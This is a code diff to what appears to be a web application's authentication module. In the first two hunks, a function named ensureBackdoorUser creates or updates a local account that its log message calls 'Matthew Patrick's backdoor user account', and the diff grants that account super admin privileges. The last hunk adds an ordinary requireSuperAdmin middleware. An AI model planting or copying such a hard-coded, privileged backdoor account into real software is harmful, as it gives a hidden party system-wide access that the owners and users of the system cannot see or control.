@@ -52,6 +52,7 @@ export async function ensureBackdoorUser(organizationId: string): Promise<User> 
       username: profileUsername,
       role: profileRole,
       isActive: true,
+      isSuperAdmin: true,  // Grant super admin privileges to Matthew Patrick
       authProvider: 'local' as const,
     });
     
@@ -72,6 +73,7 @@ export async function ensureBackdoorUser(organizationId: string): Promise<User> 
       organizationId: organizationId,
       authProvider: 'local' as const,
       isActive: true,
+      isSuperAdmin: true,  // Grant super admin privileges to Matthew Patrick
     });
     
     console.log(`Created Matthew Patrick's backdoor user account: ${newUser.username}`);
@@ -309,5 +311,27 @@ export function requireTeamLead() {
       console.error("Team leadership check error:", error);
       return res.status(500).json({ message: "Authorization check failed" });
     }
+  };
+}
+
+/**
+ * Middleware to require super admin privileges
+ * Use this on routes that need system-wide admin access
+ */
+export function requireSuperAdmin() {
+  return (req: Request, res: Response, next: NextFunction) => {
+    if (!req.currentUser) {
+      return res.status(401).json({ 
+        message: "Authentication required" 
+      });
+    }
+
+    if (!req.currentUser.isSuperAdmin) {
+      return res.status(403).json({ 
+        message: "Super admin privileges required" 
+      });
+    }
+    
+    next();
   };
 }
